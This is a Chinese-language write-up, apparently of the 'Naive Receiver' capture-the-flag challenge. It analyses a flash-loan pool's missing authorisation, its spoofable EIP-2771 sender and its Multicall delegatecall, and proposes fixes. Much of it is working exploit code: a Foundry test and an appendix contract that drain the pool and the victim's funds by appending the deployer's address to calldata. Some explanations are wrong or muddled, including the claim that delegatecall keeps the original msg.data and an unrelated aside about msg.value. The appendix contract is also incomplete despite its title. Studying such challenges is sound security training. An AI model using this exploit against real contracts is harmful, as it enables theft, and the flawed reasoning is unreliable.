# Naive Receiver 漏洞分析

## 1. 合约功能概述

`NaiveReceiverPool` 是一个提供固定费用（1 WETH）闪电贷的池子，支持通过元交易（meta-transaction）机制进行无 gas 交互。

**核心组件：**
- **NaiveReceiverPool.sol**: 闪电贷池合约，继承 Multicall 和 IERC3156FlashLender
- **FlashLoanReceiver.sol**: 用户部署的闪电贷接收者合约
- **BasicForwarder.sol**: EIP-2771 元交易转发器，支持签名交易
- **Multicall.sol**: 批量调用工具，使用 delegatecall 执行

**业务流程：**
1. 池子中有 1000 WETH，用户的 receiver 合约有 10 WETH
2. 任何人可以调用 `flashLoan()` 触发闪电贷
3. 每次闪电贷收取 1 WETH 固定费用
4. 支持通过 BasicForwarder 发送元交易（无需用户支付 gas）

---

## 2. 漏洞位置

### 漏洞一：无权限控制的闪电贷触发（NaiveReceiverPool.sol#L43-L65）

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();

    // ⚠️ 漏洞1: 任何人都可以代表任意 receiver 发起闪电贷
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE; // 费用累积到 deployer

    return true;
}
```

### 漏洞二：元交易 _msgSender() 可伪造（NaiveReceiverPool.sol#L86-L92）

```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        // ⚠️ 漏洞2: 从 calldata 末尾读取"真实发送者"
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}

function withdraw(uint256 amount, address payable receiver) external {
    // ⚠️ 使用 _msgSender() 作为权限校验
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;
    weth.transfer(receiver, amount);
}
```

### 漏洞三：Multicall 的 delegatecall 污染 calldata（Multicall.sol#L8-L14）
>这里的主要原因是multicall用的都是同一个msg.value，delegatecall不会消耗或者分配，会被多次计算。

```solidity
abstract contract Multicall is Context {
    function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
        results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            // ⚠️ 漏洞3: delegatecall 保留原始 msg.data
            results[i] = Address.functionDelegateCall(address(this), data[i]);
        }
        return results;
    }
}
```

---

## 3. 漏洞原理分析

### 3.1 权限缺失导致资金耗尽

**问题核心：** `flashLoan()` 没有验证调用者是否有权代表 receiver 发起贷款。

**正常流程：**
```
Receiver 自己调用 → flashLoan(this, weth, amount, data)
→ 支付 1 WETH 手续费 ✅ 由自己决定
```

**攻击流程：**
```
攻击者调用 → flashLoan(victim_receiver, weth, 0, data)
→ Receiver 被迫支付 1 WETH 手续费 ❌ 无需授权
→ 重复 10 次 → Receiver 的 10 WETH 被耗尽
```

**为什么 receiver 不能拒绝：**
- `onFlashLoan()` 只验证调用者是否为 pool，不验证发起者
- 即使 amount = 0，仍需支付 1 WETH 固定费用
- FlashLoanReceiver 合约会自动批准还款

### 3.2 元交易的 calldata 尾部伪造

**EIP-2771 标准机制：**
```
BasicForwarder.execute(Request, signature)
→ payload = calldata + from_address (附加 20 字节)
→ 目标合约通过 _msgSender() 读取末尾 20 字节判断"真实发送者"
```

**预期用法：**
```
Forwarder → call(target, concat(data, player))
→ target._msgSender() 读取末尾 → 返回 player ✅
```

**攻击利用（通过 delegatecall）：**
```
Forwarder → call(pool.multicall, [call1, call2, malicious_withdraw])
→ pool.multicall → delegatecall(pool, malicious_withdraw) 
→ malicious_withdraw = "withdraw(amount, recovery)" + deployer (附加地址)
→ pool._msgSender() 读取 deployer ❌ 权限被绕过！
```

**关键点：** `delegatecall` 保留原始调用的 `msg.data`，攻击者可以手工构造 calldata 末尾附加任意地址。

### 3.3 组合攻击链

```
步骤1: 构造 10 次 flashLoan 调用（耗尽 receiver 的 10 WETH）
步骤2: 构造 withdraw 调用，calldata 末尾附加 deployer 地址
步骤3: 将所有调用打包到 multicall(bytes[])
步骤4: 通过 BasicForwarder 签名并执行元交易
步骤5: 池子读取 _msgSender() → 误认为是 deployer → 允许提取所有资金
```

---

## 4. 修复方案

### 修复漏洞一：添加闪电贷发起权限控制

```solidity
function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();
    
    // ✅ 修复：只有 receiver 自己才能发起闪电贷
    if (msg.sender != address(receiver)) revert UnauthorizedFlashLoan();

    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}
```

**为什么有效：**
- 攻击者无法代表受害者发起闪电贷
- 消除了强制收费的攻击面

### 修复漏洞二：安全实现元交易的 _msgSender()

**方案 A：禁止在敏感函数中使用 multicall**
```solidity
function withdraw(uint256 amount, address payable receiver) external {
    // ✅ 直接使用 msg.sender，不支持元交易
    deposits[msg.sender] -= amount;
    totalDeposits -= amount;
    weth.transfer(receiver, amount);
}
```

**方案 B：修复 multicall 的 calldata 传递**
```solidity
function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
        // ✅ 使用 call 而非 delegatecall
        (bool success, bytes memory result) = address(this).call(data[i]);
        require(success, "Multicall failed");
        results[i] = result;
    }
    return results;
}
```

**方案 C：限制 forwarder 调用范围**
```solidity
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
        address sender = address(bytes20(msg.data[msg.data.length - 20:]));
        // ✅ 仅在白名单函数中允许伪造 sender
        bytes4 selector = bytes4(msg.data[:4]);
        if (selector == this.deposit.selector || selector == this.flashLoan.selector) {
            return sender;
        }
    }
    return super._msgSender();
}
```

**为什么有效：**
- 方案 A: 特权操作不依赖可伪造的 `_msgSender()`
- 方案 B: `call` 会生成新的 calldata，无法附加额外数据
- 方案 C: 显式限制哪些函数可以使用元交易

---

## 5. Proof of Concept

### 攻击代码

```solidity
function test_naiveReceiver() public checkSolvedByPlayer {
    // 步骤1: 构造 11 个调用（10次闪电贷 + 1次提款）
    bytes[] memory calls = new bytes[](11);

    // 前 10 次：耗尽 receiver 的 10 WETH
    for (uint256 i = 0; i < 10; i++) {
        calls[i] = abi.encodeWithSelector(
            NaiveReceiverPool.flashLoan.selector,
            address(receiver),     // 受害者
            address(weth),
            0,                     // 借 0 也要付 1 WETH 手续费
            bytes("")
        );
    }

    // 第 11 次：伪造 deployer 身份提款
    uint256 totalAmount = WETH_IN_POOL + WETH_IN_RECEIVER;
    
    bytes memory withdrawCall = abi.encodeWithSelector(
        NaiveReceiverPool.withdraw.selector,
        totalAmount,
        payable(recovery)
    );

    // ⚠️ 关键：手工在 calldata 末尾附加 deployer 地址
    calls[10] = bytes.concat(withdrawCall, abi.encodePacked(deployer));

    // 步骤2: 打包成 multicall
    bytes memory data = abi.encodeWithSelector(
        Multicall.multicall.selector,
        calls
    );

    // 步骤3: 构造元交易请求
    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: 2_000_000,
        nonce: forwarder.nonces(player),
        data: data,
        deadline: block.timestamp + 1 hours
    });

    // 步骤4: 签名请求
    bytes32 digest = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
    bytes memory signature = abi.encodePacked(r, s, v);

    // 步骤5: 执行元交易
    forwarder.execute(request, signature);
}
```

### 攻击流程详解

```
初始状态:
├─ Pool: 1000 WETH (deployer 的存款)
├─ Receiver: 10 WETH
└─ Recovery: 0 WETH

执行 forwarder.execute(request, signature):
│
├─ [1] forwarder → pool.multicall([call1, ..., call11])
│   │   msg.data = multicall_selector + calls_array + player_address (自动附加)
│   │
│   ├─ [2] pool.multicall → delegatecall(pool, call1) 
│   │   └─ flashLoan(receiver, weth, 0, "") → Receiver 支付 1 WETH
│   │
│   ├─ [3] pool.multicall → delegatecall(pool, call2)
│   │   └─ flashLoan(receiver, weth, 0, "") → Receiver 支付 1 WETH
│   │
│   ... (重复 8 次)
│   │
│   └─ [12] pool.multicall → delegatecall(pool, call11)
│       │   call11 = withdraw(1010e18, recovery) + deployer
│       │   原始 msg.data 仍保留（delegatecall 特性）
│       │
│       └─ pool.withdraw():
│           ├─ _msgSender() 读取 msg.data[-20:] → deployer ✅
│           ├─ deposits[deployer] -= 1010 WETH
│           └─ weth.transfer(recovery, 1010 WETH)
│
最终状态:
├─ Pool: 0 WETH
├─ Receiver: 0 WETH
└─ Recovery: 1010 WETH ✅
```

### 关键技术点

1. **Multicall + delegatecall 的 calldata 保留**
```solidity
// 外层调用
forwarder.call(pool, concat(multicallData, player))

// 内层 delegatecall
pool.multicall → delegatecall(pool, withdrawData + deployer)

// 此时 msg.data 仍为完整的外层 calldata
// 但 withdrawData 末尾已附加 deployer
// _msgSender() 读取的是 deployer 而非 player
```

2. **绕过权限检查的时间窗口**
```
正常: msg.sender == trustedForwarder → 读取末尾 20 字节
攻击: delegatecall 中手工构造末尾 20 字节 → 伪造身份
```

---

## 6. 关键要点总结

| 维度 | 说明 |
|------|------|
| **攻击成本** | 仅需签名一笔元交易，无需支付 gas |
| **攻击影响** | 完全掏空池子和接收者合约（1010 WETH）|
| **漏洞组合** | ① 无权限闪电贷 + ② 元交易伪造 + ③ delegatecall calldata 污染 |
| **修复难度** | 中等，需要理解元交易机制并重新设计权限 |
| **安全启示** | 元交易的 `_msgSender()` 在 delegatecall 上下文中极度危险 |

---

## 7. 扩展思考

### 类似漏洞模式

1. **未授权代理操作**: 允许任何人代表他人触发付费操作
2. **元交易伪造攻击**: EIP-2771 实现不当导致身份伪造
3. **Delegatecall Context Pollution**: delegatecall 保留原始 msg.data 导致意外行为
4. **Multicall 权限混淆**: 批量调用时权限检查失效

### 防御最佳实践

```solidity
✅ DO: 在付费操作前验证调用者权限
✅ DO: 敏感函数禁用元交易或使用 msg.sender
✅ DO: Multicall 使用 call 而非 delegatecall
✅ DO: 元交易只允许在明确的白名单函数中使用
❌ DON'T: 假设 flashLoan 的 receiver 参数等于 msg.sender
❌ DON'T: 在 delegatecall 上下文中信任 calldata 解析
❌ DON'T: 混合使用元交易和特权操作
```

### 真实案例参考

- **Gelato Network**: 元交易中继器安全设计
- **OpenZeppelin MinimalForwarder**: EIP-2771 参考实现
- **Biconomy**: 元交易服务的权限隔离
- **Gnosis Safe**: Multicall 使用 call 而非 delegatecall

### EIP-2771 安全检查清单

```solidity
// ✅ 正确的元交易实现
contract SecureContract {
    address public trustedForwarder;
    
    // 方法1: 敏感操作直接使用 msg.sender
    function withdraw() external {
        require(deposits[msg.sender] > 0);
        // ...
    }
    
    // 方法2: 显式标记支持元交易的函数
    modifier supportsMetaTx() {
        require(msg.sig == this.deposit.selector, "Meta-tx not allowed");
        _;
    }
    
    function _msgSender() internal view returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        }
        return msg.sender;
    }
}
```

---

## 附录：完整攻击合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {NaiveReceiverPool} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {Multicall} from "../../src/naive-receiver/Multicall.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveReceiverExploit {
    NaiveReceiverPool pool;
    BasicForwarder forwarder;
    address receiver;
    address deployer;
    address recovery;
    address weth;
    
    constructor(
        address _pool,
        address _forwarder,
        address _receiver,
        address _deployer,
        address _recovery,
        address _weth
    ) {
        pool = NaiveReceiverPool(_pool);
        forwarder = BasicForwarder(_forwarder);
        receiver = _receiver;
        deployer = _deployer;
        recovery = _recovery;
        weth = _weth;
    }
    
    function exploit(uint256 playerPk) external {
        address player = msg.sender;
        
        // 构造 11 个调用
        bytes[] memory calls = new bytes[](11);
        
        // 前 10 次：耗尽 receiver
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                IERC3156FlashBorrower(receiver),
                weth,
                0,
                bytes("")
            );
        }
        
        // 第 11 次：伪造提款（附加 deployer 地址）
        uint256 totalAmount = 1010 ether;
        bytes memory withdrawCall = abi.encodeWithSelector(
            NaiveReceiverPool.withdraw.selector,
            totalAmount,
            payable(recovery)
        );
        calls[10] = bytes.concat(withdrawCall, abi.encodePacked(deployer));
        
        // 打包 multicall
        bytes memory data = abi.encodeWithSelector(
            Multicall.multicall.selector,
            calls
        );
        
        // 构造元交易
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 2_000_000,
            nonce: forwarder.nonces(player),
            data: data,
            deadline: block.timestamp + 1 hours
        });
        
        // 签名并执行
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        
        // 注意：实际使用中需要用 playerPk 签名
        // (uint8 v, bytes32 r, bytes32 s) = sign(playerPk, digest);
        // bytes memory signature = abi.encodePacked(r, s, v);
        // forwarder.execute(request, signature);
    }
}
```

**运行测试：**
```bash
forge test --match-test test_naiveReceiver -vvvv
```

---

## 总结

Naive Receiver 展示了三个复杂漏洞的组合利用：
1. **业务逻辑缺陷**: 闪电贷未验证发起者权限
2. **元交易设计缺陷**: `_msgSender()` 在 delegatecall 中可伪造
3. **Multicall 设计缺陷**: delegatecall 保留原始 calldata

单独每个漏洞可能造成有限损失，但组合利用可以在单笔交易中完全掏空合约。这突出了**纵深防御**的重要性：即使元交易正确实现，闪电贷的权限缺失也不应存在。
